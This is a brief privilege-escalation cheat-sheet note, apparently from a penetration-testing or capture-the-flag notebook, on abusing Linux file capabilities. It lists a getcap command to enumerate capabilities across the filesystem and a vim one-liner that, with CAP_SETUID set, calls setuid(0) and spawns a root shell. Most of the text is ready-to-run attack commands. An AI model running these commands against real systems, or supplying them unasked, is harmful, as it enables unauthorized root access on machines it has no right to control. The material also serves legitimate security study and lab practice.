Capabilities help manage privileges at a more granular level.
# Exploiting Capabilities

First, we use `getcap` tool to list enabled capabilities:

```bash
getcap -r / 2>/dev/null
```

then we use search `GTFObins` online for a list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

For example if we have `CAP_SETUID` set for `vim` we can use the following command to escalate our privileges:

```bash
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
#Note: use py3 if the machine supports py3 not py
```